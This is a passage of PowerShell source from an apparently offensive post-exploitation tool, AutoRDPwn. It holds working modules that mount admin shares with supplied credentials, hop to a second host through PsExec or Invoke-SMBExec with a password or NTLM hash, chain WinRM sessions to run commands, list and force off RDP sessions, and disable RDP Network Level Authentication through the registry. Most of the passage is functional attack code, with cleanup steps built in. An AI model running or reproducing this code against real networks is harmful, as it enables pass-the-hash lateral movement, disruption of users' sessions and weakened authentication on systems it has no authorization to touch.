    Assert-ARPort -Computer $target -Port 445 -Purpose 'Share mount'
    $session = Get-ARTargetSession
    if ([string]::IsNullOrWhiteSpace($Share)) { $Share = '\\' + $target + '\C$' }
    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
    if ($script:ARInvokedFromOption) {
        if ([string]::IsNullOrWhiteSpace($User)) { throw 'The share mount needs a user name; it cannot be prompted for in -option mode.' }
        if ([string]::IsNullOrWhiteSpace($Password)) { throw 'The share mount needs a password; it cannot be prompted for in -option mode.' }
    }
    else {
        $Share = Read-ARValue 'UNC path of the share' $Share
        $DriveLetter = Read-ARValue 'Drive letter on the target' $DriveLetter
        $User = Read-ARValue 'User for the share' $User
        $plain = Read-ARSecret ('Password for ' + $User)
        if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
    }
    if ($Share -notmatch '^\\\\[^\\]+\\') { throw ('Not a UNC path: ' + $Share) }
    $letter = $DriveLetter.Trim().TrimEnd(':')
    if ($letter.Length -ne 1 -or $letter -notmatch '^[A-Za-z]$') { throw ('Invalid drive letter: ' + $DriveLetter) }
    $letter = $letter.ToUpperInvariant()
    if ([int][char]$letter -lt [int][char]'D') { throw ('Drive letter ' + $letter + ' is reserved for local volumes; pick D-Z.') }
    if ([string]::IsNullOrWhiteSpace($Password)) { throw 'The share mount needs a password.' }
    $drive = $letter + ':'
    $mounted = $false
    $alreadyMounted = $false
    $message = ''
    $removed = @()
    $failed = @()
    $mountBlock = {
        param($uncPath, $driveLetter, $account, $secret)
        $result = [pscustomobject]@{ Mounted = $false; Already = $false; Message = ''; User = $account; Letter = $driveLetter }
        $driveName = $driveLetter + ':'
        $taken = ''
        foreach ($volume in [System.IO.DriveInfo]::GetDrives()) {
            if ([string]$volume.Name -eq ($driveName + '\')) { $taken = [string]$volume.DriveType }
        }
        if ($taken -ne '') {
            if ($taken -eq 'Network') {
                $known = ''
                try {
                    foreach ($mapping in @(Get-SmbMapping -ErrorAction Stop)) {
                        if (([string]$mapping.LocalPath).ToUpperInvariant() -eq ($driveName + '\')) { $known = [string]$mapping.RemotePath }
                    }
                }
                catch { }
                if ($known -eq $uncPath) {
                    $result.Already = $true
                    $result.Mounted = $true
                    $result.Message = 'already mapped'
                    return $result
                }
                if ($known -ne '') { throw ('Drive ' + $driveName + ' is already mapped to ' + $known + '.') }
            }
            throw ('Drive letter ' + $driveName + ' already exists on this host (' + $taken + ').')
        }
        # cmdkey keeps the secret out of the net use command line, which is the
        # whole point of doing the two-step instead of passing /user to net use.
        $null = & cmdkey.exe ('/generic:' + $uncPath) ('/user:' + $account) ('/pass:' + $secret) 2>&1
        if ($LASTEXITCODE -ne 0) { throw ('cmdkey refused the credential for ' + $uncPath + ' (exit ' + [string]$LASTEXITCODE + ').') }
        $output = @(& net.exe use $driveName $uncPath 2>&1)
        $exit = $LASTEXITCODE
        $text = ((@($output) | ForEach-Object { [string]$_ }) -join ' ').Trim()
        $result.Message = $text
        if ($exit -ne 0) { throw ('net use ' + $driveName + ' ' + $uncPath + ' failed (exit ' + [string]$exit + '): ' + $text) }
        if (-not (Test-Path -LiteralPath ($driveName + '\'))) { throw ('net use returned 0 but ' + $driveName + '\ does not resolve.') }
        $result.Mounted = $true
        return $result
    }
    $cleanBlock = {
        param($uncPath, $driveLetter)
        $gone = New-Object System.Collections.Generic.List[string]
        $kept = New-Object System.Collections.Generic.List[string]
        $driveName = $driveLetter + ':'
        $null = & net.exe use $driveName '/delete' '/y' 2>&1
        if ($LASTEXITCODE -ne 0) { $kept.Add('net use ' + $driveName + ' /delete') } else { $gone.Add('net use ' + $driveName) }
        $null = & cmdkey.exe ('/delete:' + $uncPath) 2>&1
        if ($LASTEXITCODE -ne 0) { $kept.Add('cmdkey /delete:' + $uncPath) } else { $gone.Add('cmdkey ' + $uncPath) }
        $left = 0
        try {
            foreach ($mapping in @(Get-SmbMapping -ErrorAction SilentlyContinue)) {
                if (([string]$mapping.LocalPath).ToUpperInvariant() -eq ($driveName + '\')) { $left++ }
                elseif ([string]$mapping.RemotePath -eq $uncPath) { $left++ }
            }
        }
        catch { }
        if ($left -gt 0) {
            $kept.Add('mapping still listed after the delete')
            $null = & net.exe use $driveName '/delete' '/y' 2>&1
        }
        $credentialLeft = 0
        try {
            $list = @(& cmdkey.exe '/list' 2>&1)
            foreach ($line in $list) { if (([string]$line).IndexOf($uncPath, [System.StringComparison]::OrdinalIgnoreCase) -ge 0) { $credentialLeft++ } }
        }
        catch { }
        if ($credentialLeft -gt 0) { $kept.Add('cmdkey entry still listed for ' + $uncPath) }
        return [pscustomobject]@{ Removed = @($gone.ToArray()); Failed = @($kept.ToArray()); Left = [int]($left + $credentialLeft) }
    }
    try {
        Write-ARInfo ('Mounting ' + $Share + ' as ' + $drive + ' on ' + $target + ' as ' + $User)
        $result = Invoke-ARRemote -Session $session -ArgumentList $Share, $letter, $User, $Password -ScriptBlock $mountBlock
        $mounted = [bool]$result.Mounted
        $alreadyMounted = [bool]$result.Already
        $message = [string]$result.Message
        if ($mounted) {
            if ($alreadyMounted) { Write-ARInfo ($drive + ' was already mapped to ' + $Share + '; it will be left as it was.') }
            else { Write-ARSuccess ('Mounted ' + $Share + ' as ' + $drive + ' on ' + $target) }
        }
    }
    finally {
        try {
            $cleanup = Invoke-ARRemote -Session $session -ArgumentList $Share, $letter -ScriptBlock $cleanBlock
            $removed = @($cleanup.Removed)
            $failed = @($cleanup.Failed)
            foreach ($item in $removed) { Write-ARSuccess ('Removed: ' + [string]$item) }
            foreach ($item in $failed) { Write-ARWarn ('Not removed: ' + [string]$item) }
            if ([int]$cleanup.Left -eq 0) { Write-ARInfo ('No mapping and no stored credential is left for ' + $Share + ' on ' + $target) }
        }
        catch { $failed = @('cleanup could not run: ' + $_.Exception.Message); Write-ARWarn ('Share cleanup failed: ' + $_.Exception.Message) }
    }
    Set-ARStatus 'Share mount proof finished' 'Ok'
    return [pscustomobject]@{
        Id       = '622'
        Action   = 'ShareMount'
        Target   = $target
        Share    = $Share
        Drive    = $drive
        User     = $User
        Mounted  = [bool]$mounted
        Existing = [bool]$alreadyMounted
        Removed  = @($removed)
        Failed   = @($failed)
        Output   = $message
    }
}

function Invoke-ARModuleHopPsExec {
    param(
        [string]$Computer = '',
        [string]$User = '',
        [string]$Password = '',
        [string]$Hash = '',
        [string]$Command = ''
    )
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'PSexec hop'
    Assert-ARPort -Computer $target -Port 445 -Purpose 'PSexec hop'
    $session = Get-ARTargetSession
    if ([string]::IsNullOrWhiteSpace($Computer)) {
        if ($script:ARInvokedFromOption) { throw 'The PSexec hop needs a second host; it cannot be prompted for in -option mode.' }
        $Computer = Read-ARValue 'Second host (reached from the first one)'
    }
    $hop = $Computer.Trim()
    if ([string]::IsNullOrWhiteSpace($hop)) { throw 'The second host is empty.' }
    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
    if ([string]::IsNullOrWhiteSpace($Hash)) { $Hash = [string]$script:ARTarget['Hash'] }
    if ([string]::IsNullOrWhiteSpace($Password)) { $Password = [string]$script:ARTarget['Password'] }
    if (-not $script:ARInvokedFromOption) {
        $User = Read-ARValue 'User for the second host' $User
        $Hash = Read-ARValue 'NTLM hash for the second host (empty to use a password)' $Hash
        if ([string]::IsNullOrWhiteSpace($Hash)) {
            $plain = Read-ARSecret ('Password for ' + $User)
            if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
        }
    }
    if ([string]::IsNullOrWhiteSpace($User)) { throw 'The PSexec hop needs a user name.' }
    if ([string]::IsNullOrWhiteSpace($Hash) -and [string]::IsNullOrWhiteSpace($Password)) {
        throw 'The PSexec hop needs either an NTLM hash or a password.'
    }
    $transport = 'password'
    if (-not [string]::IsNullOrWhiteSpace($Hash)) { $transport = 'hash' }
    $domain = [string]$script:ARTarget['Domain']
    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
    if ([string]::IsNullOrWhiteSpace($Command)) { $Command = 'echo AutoRDPwn hop payload ran at %DATE% %TIME% >> "' + $proofLog + '"' }
    if (-not $script:ARInvokedFromOption) { $Command = Read-ARValue 'Command to run on the second host' $Command }
    if ($Command -match "[\r\n]") { throw 'The command must be a single line.' }
    # Only an artifact this handler named is ever deleted afterwards: a custom
    # command owns whatever it writes.
    $artifactHop = ''
    if ($Command.Contains($proofLog)) { $artifactHop = $proofLog }
    $probeBlock = {
        param($hopHost, $hopPort)
        $client = New-Object System.Net.Sockets.TcpClient
        try {
            $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
            if (-not $async.AsyncWaitHandle.WaitOne(4000, $false)) { return $false }
            $client.EndConnect($async)
            return $true
        }
        catch { return $false }
        finally { $client.Close() }
    }
    $reachable = [bool](Invoke-ARRemote -Session $session -ArgumentList $hop, 445 -ScriptBlock $probeBlock)
    if (-not $reachable) { throw ('The second host ' + $hop + ' is unreachable from ' + $target + ' on TCP 445; nothing was staged.') }
    $token = New-ARRemoteTempName
    $executablePath = 'C:\Windows\Temp\' + $token + '.exe'
    $scriptPath = 'C:\Windows\Temp\' + $token + '-smbexec.ps1'
    $staged = New-Object System.Collections.Generic.List[string]
    $removedFirst = New-Object System.Collections.Generic.List[string]
    $removedHop = New-Object System.Collections.Generic.List[string]
    $failed = New-Object System.Collections.Generic.List[string]
    $started = $false
    $exitCode = -1
    $proof = ''
    try {
        if ($transport -eq 'hash') {
            $localScript = Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1'
            Copy-ARFileToTarget -LocalPath $localScript -RemotePath $scriptPath | Out-Null
            $staged.Add($scriptPath)
        }
        if ($transport -eq 'password') {
            Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
            $localExecutable = Join-Path $script:ARTools 'psexec.exe'
            if (-not (Test-Path -LiteralPath $localExecutable)) { throw 'PSexec could not be extracted.' }
            Copy-ARFileToTarget -LocalPath $localExecutable -RemotePath $executablePath | Out-Null
            $staged.Add($executablePath)
        }
        foreach ($path in $staged.ToArray()) {
            if (-not $script:ARModuleFiles.Contains([string]$path)) { $script:ARModuleFiles.Add([string]$path) }
        }
        $hopBlock = {
            param($mode, $transportKind, $exePath, $smbScript, $hopHost, $account, $secret, $hashText, $domainName, $line, $detach)
            $invokeOnHop = {
                param($remoteLine, $detached)
                if ($transportKind -eq 'hash') {
                    if (-not (Get-Command Invoke-SMBExec -ErrorAction SilentlyContinue)) { . $smbScript }
                    $output = @(Invoke-SMBExec -Target $hopHost -Domain $domainName -Username $account -Hash $hashText -Command $remoteLine 2>&1)
                    return [pscustomobject]@{ Exit = 0; Text = ((@($output) | ForEach-Object { [string]$_ }) -join "`n") }
                }
                $arguments = @(('\\' + $hopHost), '-accepteula', '-nobanner')
                if (-not [string]::IsNullOrWhiteSpace($account)) { $arguments += @('-u', $account) }
                if (-not [string]::IsNullOrWhiteSpace($secret)) { $arguments += @('-p', $secret) }
                $arguments += @('-h')
                if ($detached) { $arguments += @('-d') }
                $arguments += @('cmd.exe', '/c', $remoteLine)
                $output = @(& $exePath @arguments 2>&1)
                return [pscustomobject]@{ Exit = [int]$LASTEXITCODE; Text = ((@($output) | ForEach-Object { [string]$_ }) -join "`n") }
            }
            return (& $invokeOnHop $line $detach)
        }
        Write-ARInfo ('Launching on ' + $hop + ' through ' + $target + ' (' + $transport + ')')
        $run = Invoke-ARRemote -Session $session -ArgumentList 'run', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $Command, $true -ScriptBlock $hopBlock
        $exitCode = [int]$run.Exit
        $runText = ([string]$run.Text).Trim()
        if ($exitCode -ne 0) { throw ('PSexec returned ' + [string]$exitCode + ' for ' + $hop + ': ' + $runText) }
        $started = $true
        if (-not [string]::IsNullOrWhiteSpace($runText)) { Write-ARInfo ('Hop output: ' + $runText) }
        if ($artifactHop -ne '') {
            $readLine = 'type "' + $artifactHop + '"'
            for ($attempt = 0; $attempt -lt 15; $attempt++) {
                Start-Sleep -Seconds 1
                $read = Invoke-ARRemote -Session $session -ArgumentList 'proof', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $readLine, $false -ScriptBlock $hopBlock
                $proof = ([string]$read.Text).Trim()
                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
            }
            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn ('No proof line appeared on ' + $hop + ' in 15 s; the payload may still be starting.') }
            else { Write-ARSuccess ('Proof on ' + $hop + ': ' + $proof) }
        }
    }
    finally {
        if ($started -and $artifactHop -ne '') {
            try {
                $deleteLine = 'del /f /q "' + $artifactHop + '"'
                $null = Invoke-ARRemote -Session $session -ArgumentList 'delete', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $deleteLine, $false -ScriptBlock $hopBlock
                # The markers are ours, so the proof survives any target language.
                $existsLine = 'if exist "' + $artifactHop + '" (echo ARHOP_PRESENT) else (echo ARHOP_ABSENT)'
                $check = Invoke-ARRemote -Session $session -ArgumentList 'exists', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $existsLine, $false -ScriptBlock $hopBlock
                if (([string]$check.Text).IndexOf('ARHOP_ABSENT') -ge 0) { $removedHop.Add($artifactHop) }
                else { $failed.Add('artifact still on ' + $hop + ': ' + $artifactHop) }
            }
            catch { $failed.Add('artifact removal on ' + $hop + ' failed: ' + $_.Exception.Message) }
        }
        try {
            $serviceCheck = Invoke-ARRemote -Session $session -ArgumentList $hop -ScriptBlock {
                param($hopHost)
                $output = @(& sc.exe ('\\' + $hopHost) 'query' 'PSEXESVC' 2>&1)
                if ($LASTEXITCODE -ne 0) { return [pscustomobject]@{ Present = $false; Deleted = $false } }
                $null = & sc.exe ('\\' + $hopHost) 'delete' 'PSEXESVC' 2>&1
                return [pscustomobject]@{ Present = $true; Deleted = ([int]$LASTEXITCODE -eq 0) }
            }
            if ([bool]$serviceCheck.Present -and -not [bool]$serviceCheck.Deleted) { $failed.Add('the PSEXESVC service is still registered on ' + $hop) }
            elseif ([bool]$serviceCheck.Present) { Write-ARSuccess ('Leftover PSEXESVC service on ' + $hop + ' deleted.') }
        }
        catch { }
        try {
            $paths = @($staged.ToArray())
            if ($paths.Count -gt 0) {
                $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($paths)) -ScriptBlock {
                    param($items)
                    $gone = New-Object System.Collections.Generic.List[string]
                    $kept = New-Object System.Collections.Generic.List[string]
                    foreach ($path in @($items)) {
                        try {
                            Remove-Item -LiteralPath ([string]$path) -Force -ErrorAction Stop
                            if (Test-Path -LiteralPath ([string]$path)) { $kept.Add([string]$path) } else { $gone.Add([string]$path) }
                        }
                        catch { $kept.Add([string]$path) }
                    }
                    return [pscustomobject]@{ Removed = @($gone.ToArray()); Failed = @($kept.ToArray()) }
                }
                foreach ($path in @($removal.Removed)) {
                    [void]$script:ARModuleFiles.Remove([string]$path)
                    $removedFirst.Add([string]$path)
                }
                foreach ($path in @($removal.Failed)) { $failed.Add('staged file still on ' + $target + ': ' + [string]$path) }
            }
        }
        catch { $failed.Add('staged file removal on ' + $target + ' failed: ' + $_.Exception.Message) }
        foreach ($item in $failed.ToArray()) { Write-ARWarn ('Cleanup: ' + [string]$item) }
    }
    Set-ARStatus 'PSexec hop finished' 'Ok'
    return [pscustomobject]@{
        Id            = '623'
        Action        = 'HopPsExec'
        Target        = $target
        Hop           = $hop
        User          = $User
        Transport     = $transport
        Command       = $Command
        Started       = [bool]$started
        ExitCode      = [int]$exitCode
        Proof         = $proof
        RemovedFirst  = @($removedFirst.ToArray())
        RemovedHop    = @($removedHop.ToArray())
        Failed        = @($failed.ToArray())
    }
}

function Invoke-ARModuleHopWinRm {
    param(
        [string]$Computer = '',
        [string]$User = '',
        [string]$Password = '',
        [string]$Command = ''
    )
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRM hop'
    $openedIntermediate = $false
    if (-not $script:ARSession) { $openedIntermediate = $true }
    $session = Get-ARTargetSession
    if ([string]::IsNullOrWhiteSpace($Computer)) {
        if ($script:ARInvokedFromOption) { throw 'The WinRM hop needs a second host; it cannot be prompted for in -option mode.' }
        $Computer = Read-ARValue 'Second host (reached from the first one)'
    }
    $hop = $Computer.Trim()
    if ([string]::IsNullOrWhiteSpace($hop)) { throw 'The second host is empty.' }
    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
    if ([string]::IsNullOrWhiteSpace($Password)) { $Password = [string]$script:ARTarget['Password'] }
    if (-not $script:ARInvokedFromOption) {
        $User = Read-ARValue 'User for the second host' $User
        $plain = Read-ARSecret ('Password for ' + $User)
        if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
    }
    if ([string]::IsNullOrWhiteSpace($Command)) { $Command = 'hostname' }
    if (-not $script:ARInvokedFromOption) { $Command = Read-ARValue 'Command to run on the second host' $Command }
    if ($Command -match "[\r\n]") { throw 'The command must be a single line.' }
    $probeBlock = {
        param($hopHost, $hopPort)
        $client = New-Object System.Net.Sockets.TcpClient
        try {
            $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
            if (-not $async.AsyncWaitHandle.WaitOne(4000, $false)) { return $false }
            $client.EndConnect($async)
            return $true
        }
        catch { return $false }
        finally { $client.Close() }
    }
    $reachable = [bool](Invoke-ARRemote -Session $session -ArgumentList $hop, 5985 -ScriptBlock $probeBlock)
    if (-not $reachable) { throw ('The second host ' + $hop + ' is unreachable from ' + $target + ' on TCP 5985; no session was opened.') }
    $opened = $false
    $hopSessionId = 0
    $output = ''
    $exitCode = -1
    $closedHop = $false
    $closedIntermediate = $false
    $failures = New-Object System.Collections.Generic.List[string]
    $openBlock = {
        param($hopHost, $account, $secret, $timeoutMs)
        $parameters = @{ ComputerName = $hopHost; ErrorAction = 'Stop'; Name = ('ARHop_' + [guid]::NewGuid().ToString('N').Substring(0, 6)) }
        if (-not [string]::IsNullOrWhiteSpace($account) -and -not [string]::IsNullOrWhiteSpace($secret)) {
            $secure = ConvertTo-SecureString -String $secret -AsPlainText -Force
            $parameters['Credential'] = New-Object System.Management.Automation.PSCredential($account, $secure)
        }
        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout $timeoutMs -OperationTimeout 60000 -CancelTimeout 5000
        $hopSession = New-PSSession @parameters
        # Global, not script: the hop session has to outlive the invocation that
        # created it so the next remote block can chain through it.
        $global:ARHopSession = $hopSession
        return [pscustomobject]@{
            Id       = [int]$hopSession.Id
            Name     = [string]$hopSession.Name
            State    = [string]$hopSession.State
            Computer = [string]$hopSession.ComputerName
        }
    }
    $runBlock = {
        param($commandLine)
        $hopSession = $global:ARHopSession
        if ($null -eq $hopSession) { throw 'The chained session is gone.' }
        $state = ''
        try { $state = [string]$hopSession.State } catch { }
        if ($state -ne 'Opened') { throw ('The chained session is ' + $state + ' instead of Opened.') }
        return Invoke-Command -Session $hopSession -ArgumentList $commandLine -ScriptBlock {
            param($line)
            $text = @(& cmd.exe /c $line 2>&1)
            return [pscustomobject]@{
                Exit = [int]$LASTEXITCODE
                Text = ((@($text) | ForEach-Object { [string]$_ }) -join "`n")
            }
        } -ErrorAction Stop
    }
    $closeBlock = {
        $closedHop = $false
        $problems = New-Object System.Collections.Generic.List[string]
        $hopSession = $global:ARHopSession
        if ($null -ne $hopSession) {
            try {
                Remove-PSSession -Session $hopSession -ErrorAction Stop
                $global:ARHopSession = $null
                $closedHop = $true
            }
            catch { $problems.Add('hop session: ' + $_.Exception.Message) }
        }
        $left = 0
        foreach ($candidate in @(Get-PSSession -ErrorAction SilentlyContinue)) {
            if ([string]$candidate.Name -notlike 'ARHop_*') { continue }
            $left++
            try { Remove-PSSession -Session $candidate -ErrorAction SilentlyContinue } catch { }
        }
        return [pscustomobject]@{ Closed = [bool]$closedHop; Left = [int]$left; Failed = @($problems.ToArray()) }
    }
    try {
        $openedSession = Invoke-ARRemote -Session $session -ArgumentList $hop, $User, $Password, 15000 -ScriptBlock $openBlock
        $hopSessionId = [int]$openedSession.Id
        if ([string]$openedSession.State -ne 'Opened') { throw ('The chained session on ' + $hop + ' is ' + [string]$openedSession.State + ' instead of Opened.') }
        $opened = $true
        Write-ARSuccess ('Chained WinRM session opened: ' + $target + ' -> ' + $hop + ' (session ' + [string]$hopSessionId + ')')
        $result = Invoke-ARRemote -Session $session -ArgumentList $Command -ScriptBlock $runBlock
        $exitCode = [int]$result.Exit
        $output = ([string]$result.Text).Trim()
        Write-ARSuccess ('Output from ' + $hop + ' (exit ' + [string]$exitCode + '):')
        Show-ARText $output
    }
    catch {
        $failures.Add('hop session on ' + $hop + ': ' + $_.Exception.Message)
        Write-ARWarn ('WinRM hop to ' + $hop + ' failed: ' + $_.Exception.Message)
    }
    finally {
        try {
            $teardown = Invoke-ARRemote -Session $session -ScriptBlock $closeBlock
            $closedHop = [bool]$teardown.Closed
            foreach ($item in @($teardown.Failed)) { $failures.Add([string]$item) }
            if ([int]$teardown.Left -ne 0) { $failures.Add([string]$teardown.Left + ' ARHop session(s) still open on ' + $target) }
            if ($closedHop) { Write-ARSuccess ('Chained session closed on ' + $target + ' (was ' + $hop + ')') }
        }
        catch {
            $failures.Add('hop session teardown: ' + $_.Exception.Message)
            Write-ARWarn ('Chained session could not be closed: ' + $_.Exception.Message)
        }
        if ($openedIntermediate) {
            try {
                Close-ARTargetSession
                $closedIntermediate = $true
                Write-ARInfo ('Intermediate session closed on ' + $target)
            }
            catch { $failures.Add('intermediate session teardown: ' + $_.Exception.Message) }
        }
        else { Write-ARInfo 'The intermediate session was already open before this action and is kept.' }
    }
    Set-ARStatus 'WinRM hop finished' 'Ok'
    return [pscustomobject]@{
        Id                 = '624'
        Action             = 'HopWinRm'
        Target             = $target
        Hop                = $hop
        User               = $User
        Command            = $Command
        HopOpened          = [bool]$opened
        HopSessionId       = [int]$hopSessionId
        ExitCode           = [int]$exitCode
        Output             = $output
        HopClosed          = [bool]$closedHop
        IntermediateClosed = [bool]$closedIntermediate
        Failed             = @($failures.ToArray())
    }
}

function Invoke-ARAttackRdpSessions {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP sessions'
    $session = Get-ARTargetSession
    $data = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        # Two views of the same truth: the textual `query session` a human reads
        # and the CIM logon records a script can count. Neither writes anything.
        $query = @()
        try { $query = @(query session 2>&1 | ForEach-Object { [string]$_ }) } catch { }
        $quser = @()
        try { $quser = @(quser 2>&1 | ForEach-Object { [string]$_ }) } catch { }
        $links = @()
        try { $links = @(Get-CimInstance -ClassName Win32_LoggedOnUser -ErrorAction Stop | Select-Object -First 500) } catch { }
        $logons = @()
        try {
            # 2 interactive, 10 remote interactive, 12 cached remote interactive.
            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
                Where-Object { @(2, 10, 12) -contains [int]$_.LogonType } |
                Select-Object -First 100)
        }
        catch { }
        $rows = New-Object System.Collections.Generic.List[object]
        foreach ($logon in $logons) {
            $name = ''
            $domain = ''
            foreach ($link in $links) {
                if ([string]$link.Dependent.LogonId -ne [string]$logon.LogonId) { continue }
                $accountPath = [string]$link.Antecedent
                if ($accountPath -match 'Name="([^"]*)"') { $name = $Matches[1] }
                if ($accountPath -match 'Domain="([^"]*)"') { $domain = $Matches[1] }
                if ($name -ne '') { break }
            }
            $rows.Add([pscustomobject]@{
                LogonId   = [string]$logon.LogonId
                LogonType = [int]$logon.LogonType
                User      = $name
                Domain    = $domain
                StartTime = $logon.StartTime
            })
        }
        return [pscustomobject]@{
            QuerySession = @($query)
            QUser        = @($quser)
            Sessions     = @($rows.ToArray())
        }
    }
    $raw = @($data.QuerySession)
    if ($raw.Count -gt 0) { Show-ARText ($raw -join [Environment]::NewLine) }
    $rows = @($data.Sessions)
    if ($rows.Count -gt 0) {
        $table = ($rows | Sort-Object LogonType, User | Format-Table -AutoSize | Out-String)
        Show-ARText $table
    }
    else { Write-ARInfo 'The CIM query returned no interactive or remote logon sessions.' }
    Set-ARStatus ('RDP sessions listed (' + $rows.Count + ')') 'Ok'
    return [pscustomobject]@{
        Id       = '720'
        Action   = 'RdpSessions'
        Target   = $target
        Count    = $rows.Count
        Sessions = $rows
        Raw      = $raw
    }
}

function Invoke-ARAttackRdpDisconnect {
    param([string]$SessionId = '')
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP disconnect'
    $session = Get-ARTargetSession
    if ($SessionId -eq '') {
        $SessionId = Read-ARValue 'Session id to disconnect or log off' ''
    }
    if ($SessionId -notmatch '^\d+$') { throw ('A session id must be a number; got "' + $SessionId + '".') }
    $mode = 'disconnect'
    if (-not $script:ARAssumeYes) {
        $answer = Read-ARValue 'Type D to disconnect, L to log off, anything else cancels' 'D'
        if ($answer -match '^[Ll]') { $mode = 'logoff' }
        elseif ($answer -notmatch '^[Dd]') {
            Write-ARWarn 'Session kept: nothing was sent to the target.'
            Set-ARStatus 'RDP session kept' 'Warn'
            return [pscustomobject]@{
                Id = '721'; Action = 'RdpDisconnect'; Target = $target
                SessionId = [int]$SessionId; Mode = 'none'; Done = $false
            }
        }
    }
    $result = Invoke-Command -Session $session -ArgumentList ([int]$SessionId), $mode -ErrorAction Stop -ScriptBlock {
        param($id, $how)
        $before = @(query session 2>&1 | ForEach-Object { [string]$_ })
        $present = $false
        foreach ($line in $before) {
            if ($line -match ('(^|\s)' + [string]$id + '(\s|$)')) { $present = $true; break }
        }
        if (-not $present) {
            return [pscustomobject]@{ Found = $false; ExitCode = -1; Output = 'the id is not listed by query session'; Still = $false }
        }
        if ($how -eq 'logoff') { $output = @(logoff.exe $id 2>&1) }
        else { $output = @(tsdiscon.exe $id 2>&1) }
        $code = $LASTEXITCODE
        Start-Sleep -Seconds 1
        $after = @(query session 2>&1 | ForEach-Object { [string]$_ })
        $still = $false
        foreach ($line in $after) {
            if ($line -match ('(^|\s)' + [string]$id + '(\s|$)')) { $still = $true; break }
        }
        return [pscustomobject]@{
            Found    = $true
            ExitCode = [int]$code
            Output   = (($output | Out-String).Trim())
            Still    = $still
        }
    }
    if (-not $result.Found) { throw ('Session ' + $SessionId + ' is not present on ' + $target + '.') }
    if ([int]$result.ExitCode -ne 0) {
        throw ('The ' + $mode + ' of session ' + $SessionId + ' returned exit ' + [int]$result.ExitCode + ': ' + [string]$result.Output)
    }
    if ($result.Still) {
        Write-ARWarn ('Session ' + $SessionId + ' is still listed; the service may need a moment to settle.')
        Set-ARStatus ('Session ' + $SessionId + ' ' + $mode + ' requested') 'Warn'
    }
    else {
        Write-ARSuccess ('Session ' + $SessionId + ' was ' + $mode + 'd on ' + $target + '.')
        Set-ARStatus ('Session ' + $SessionId + ' ' + $mode) 'Ok'
    }
    return [pscustomobject]@{
        Id        = '721'
        Action    = 'RdpDisconnect'
        Target    = $target
        SessionId = [int]$SessionId
        Mode      = $mode
        Done      = $true
        StillListed = [bool]$result.Still
    }
}

function Invoke-ARAttackRdpNlaOff {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'RDP NLA off'
    $session = Get-ARTargetSession
    $keyPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
    $written = $false
    $succeeded = $false
    try {
        $state = Invoke-Command -Session $session -ArgumentList $keyPath -ErrorAction Stop -ScriptBlock {
            param($path)
            $entry = [pscustomobject]@{
                KeyPath = $path
                Name    = 'UserAuthentication'
                Existed = $false
                Value   = $null
                Kind    = 'DWord'
            }
            try {
                $key = Get-Item -LiteralPath $path -ErrorAction Stop
                if (@($key.GetValueNames()) -contains 'UserAuthentication') {
                    $entry.Existed = $true
                    $entry.Value = $key.GetValue('UserAuthentication', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                    $entry.Kind = [string]$key.GetValueKind('UserAuthentication')
                }
            }
            catch { }
            $before = $null
            if ($entry.Existed) { $before = [int]$entry.Value }
            if ($before -eq 0) {
                return [pscustomobject]@{ Already = $true; Before = 0; After = 0; Entry = $entry }
            }
            New-ItemProperty -Path $path -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
            $after = [int](Get-ItemProperty -Path $path -Name 'UserAuthentication' -ErrorAction Stop).UserAuthentication
            return [pscustomobject]@{ Already = $false; Before = $before; After = $after; Entry = $entry }
        }
        # The oldest snapshot wins, exactly like 801: a second run must not record
        # the value this action just wrote. Nothing is registered when NLA is
        # already off, because there is nothing to put back.
        if ($state.Already) {
            Write-ARInfo 'UserAuthentication is already 0: NLA is off and nothing was written.'
            Set-ARStatus 'NLA already off' 'Ok'
        }
        else {
            $known = $false
            foreach ($existing in $script:ARRegistryBackup) {
                if ($existing.KeyPath -eq $keyPath -and $existing.Name -eq 'UserAuthentication') { $known = $true; break }
            }
            if (-not $known) { $script:ARRegistryBackup.Add($state.Entry) }
            $written = $true
            Write-ARSuccess ('UserAuthentication ' + [string]$state.Before + ' -> 0 on ' + $target + '.')
            Write-ARWarn 'A TermService restart is required before clients can connect without NLA.'
            Set-ARStatus 'NLA disabled' 'Ok'
        }
        $succeeded = $true
        return [pscustomobject]@{
            Id          = '722'
            Action      = 'RdpNlaOff'
            Target      = $target
            KeyPath     = $keyPath
            Before      = $state.Before
            After       = [int]$state.After
            Written     = [bool]$written
            Restart     = [bool]$written
        }
    }
    finally {
        if ($written -and -not $succeeded) {
            # A failed run must not leave NLA off: replay the snapshot the body
            # just registered in ARRegistryBackup, then let global cleanup see it.
